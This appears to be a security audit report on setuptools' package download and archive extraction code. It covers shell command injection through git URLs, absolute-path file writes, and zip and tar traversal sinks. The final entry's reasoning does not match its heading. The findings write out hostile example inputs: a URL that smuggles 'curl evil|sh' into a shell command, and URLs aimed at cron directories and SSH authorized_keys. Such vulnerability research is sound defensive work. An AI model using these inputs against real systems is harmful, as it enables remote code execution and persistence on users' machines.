findings.description: OS command injection in PackageIndex._download_git: URL and revision parsed from an attacker-controlled VCS URL are interpolated into os.system() shell commands without quoting/escaping.
findings.code_snippet:
self.info("Doing git clone from %s to %s", url, filename)
        os.system("git clone --quiet %s %s" % (url, filename))

        if rev is not None:
            self.info("Checking out %s", rev)
            os.system(
                "git -C %s checkout --quiet %s"
                % (
                    filename,
                    rev,
                )
            )
findings.reasoning: In `_download_url` (lines ~805-825) the scheme is matched against `git`/`git+` and the raw user-supplied URL/spec is passed to `_download_git(url, filename)`. Inside `_download_git` the `url` (and the `rev` extracted by `_vcs_split_rev_from_url`, which splits on '@' but performs no shell escaping) are placed directly into a string handed to `os.system()`, which always uses `/bin/sh -c`. Any shell metacharacter (`;`, `&&`, `|`, `$(...)`, backticks) in the URL path or in the `@rev` fragment yields arbitrary command execution in the context of the user running easy_install / setup.py (e.g. `setup_requires` / `dependency_links`, or `easy_install "git+http://host/x;curl evil|sh"`). The only "sanitization" applied earlier is a `..` → `.` replacement for the download *filename*, not the URL. This is the documented class of issue for setuptools' VCS download support.

evidence.code_context: _download_url(): 'elif scheme == 'git' or scheme.startswith('git+'): return self._download_git(url, filename)' — url is the raw spec from download(); _vcs_split_rev_from_url() only splits on '@' and strips fragments; no quoting is applied.
evidence.dataflow_analysis: Spec string (download/easy_install/easy_install command line, dependency_links, setup_requires) -> URL_SCHEME match -> _download_url(scheme, url, tmpdir) -> _download_git(url, filename) -> os.system("git clone --quiet %s %s" % (url, filename)); rev = path.rsplit('@',1)[1] -> os.system("git -C %s checkout --quiet %s" % (filename, rev))
evidence.notes: os.system always invokes a shell; no shlex.quote anywhere in the module.

findings.description: Downloaded package filename derived from attacker-controlled URL is joined to tmpdir without stripping absolute paths, allowing arbitrary file write outside tmpdir (CVE-2024-6345 class)
findings.reasoning: `download()` (line 611) and `easy_install()` (easy_install.py:679) call `_download_url(scheme, spec, tmpdir)` with a URL taken directly from user input (`easy_install <URL>`, `--find-links`, `#egg=` fragments, or links harvested from an index page). The local filename is computed at lines 816-828 from `egg_info_for_url(url)`. The sanitization loop only neutralizes `..` sequences; it never strips a leading `/` (or Windows drive/UNC prefix), so a URL such as `http://evil.invalid//etc/cron.d/pwn` or `http://evil.invalid//home/user/.ssh/authorized_keys` yields `name = '/etc/cron.d/pwn'`, and `os.path.join(tmpdir, name)` returns the absolute path, discarding `tmpdir`. The payload is then written with `open(filename, 'wb')` in `_download_to` (line 767), giving an arbitrary file write outside the temporary directory — the same defect class as CVE-2024-6345 (easy_install arbitrary file write → code execution). Because the content is fully attacker controlled, this directly leads to code execution (e.g. writing to a cron directory, sitecustomize.py, or a .pth file).

findings.description: Zip extraction (Zip Slip) sink: unpack_zipfile delegates to _unpack_zipfile_obj, which relies on a string-based name check that can be bypassed on Windows with backslash separators
findings.code_snippet:
if not zipfile.is_zipfile(filename):
        raise UnrecognizedFormat("%s is not a zip file" % (filename,))

    with zipfile.ZipFile(filename) as z:
        _unpack_zipfile_obj(z, extract_dir, progress_filter)
findings.reasoning:
unpack_zipfile() extracts attacker-controlled archive content. The sink is protected by the guard in _unpack_zipfile_obj:

    for info in zipfile_obj.infolist():
        name = info.filename
        # don't extract absolute paths or ones with .. in them
        if name.startswith('/') or '..' in name.split('/'):
            continue
        target = os.path.join(extract_dir, *name.split('/'))
        ...
        with open(target, 'wb') as f: f.write(data)

This blocks POSIX-style absolute paths and `../` segments, which is the upstream CVE-2024-6345 fix. However the check is purely textual and splits on '/' only, so an entry named `..\..\evil.py` (or `C:\evil` on Windows) passes the guard and, after os.path.join, resolves outside extract_dir when the process runs on Windows. Also, chmod is applied with attacker-controlled external_attr. Because the common exploitation paths are blocked, this is a residual hardening gap rather than an immediately exploitable Zip Slip — manual review of Windows behavior recommended.

evidence.notes: Guard present for '/' separators and absolute paths, but not for '\\' separators or drive letters, so Windows-hosted extractions remain bypassable.

findings.description: Tar extraction sink: unpack_tarfile -> _iter_open_tar -> tarobj._extract_member with member names validated only by a textual '..'/absolute-path check, symlink resolution handled by a private API

Manual review recommended rather than an outright confirmed exploit.

findings.reasoning: This module is a documented entry point: `python -m setuptools.launch script.py` is literally defined as "Launch the Python script on the command line after setuptools is bootstrapped via import." The exec'd content is the file the *local operator* passed as argv[1] on their own command line. That is the same trust level as running `python script.py`. The data source is `sys.argv[1]`, not network/remote input, and there is no privilege boundary crossed: an attacker who can choose the script path can already execute arbitrary Python directly. The "unsafe deserialization/dynamic execution site" alert matches the syntactic pattern of exec(compile(open(...))) which is the entire purpose of the file, so this is a false positive for a vulnerability report.
